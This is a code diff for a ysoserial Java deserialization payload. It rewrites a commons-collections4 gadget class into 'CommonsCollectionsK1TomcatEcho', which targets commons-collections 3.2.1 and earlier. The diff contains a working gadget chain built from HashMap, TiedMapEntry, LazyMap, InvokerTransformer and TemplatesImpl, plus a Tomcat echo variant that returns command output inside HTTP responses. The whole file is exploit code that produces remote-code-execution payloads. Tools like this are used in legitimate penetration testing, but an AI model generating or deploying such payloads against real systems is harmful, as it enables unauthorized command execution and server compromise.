@@ -1,8 +1,8 @@
 package ysoserial.payloads;
 
-import org.apache.commons.collections4.functors.InvokerTransformer;
-import org.apache.commons.collections4.keyvalue.TiedMapEntry;
-import org.apache.commons.collections4.map.LazyMap;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
@@ -14,19 +14,24 @@ import java.util.Map;
 
 /*
 Gadget chain:
-same as K1, but use commons-collections4.0
+     HashMap
+       TiedMapEntry.hashCode
+         TiedMapEntry.getValue
+           LazyMap.decorate
+             InvokerTransformer
+               templates...
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@Dependencies({"commons-collections:commons-collections4:4.0"})
+@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
 @Authors({Authors.KORLR})
-public class CommonsCollectionsK2 extends PayloadRunner implements ObjectPayload<Map> {
+public class CommonsCollectionsK1TomcatEcho extends PayloadRunner implements ObjectPayload<Map> {
 
     public Map getObject(final String command) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(command);
+        Object tpl = Gadgets.createTemplatesTomcatEcho();
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         HashMap<String, String> innerMap = new HashMap<String, String>();
-        Map m = LazyMap.lazyMap(innerMap, transformer);
+        Map m = LazyMap.decorate(innerMap, transformer);
 
         Map outerMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(m, tpl);
@@ -39,6 +44,6 @@ public class CommonsCollectionsK2 extends PayloadRunner implements ObjectPayload
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollectionsK2.class, args);
+        PayloadRunner.run(CommonsCollectionsK1TomcatEcho.class, args);
     }
 }
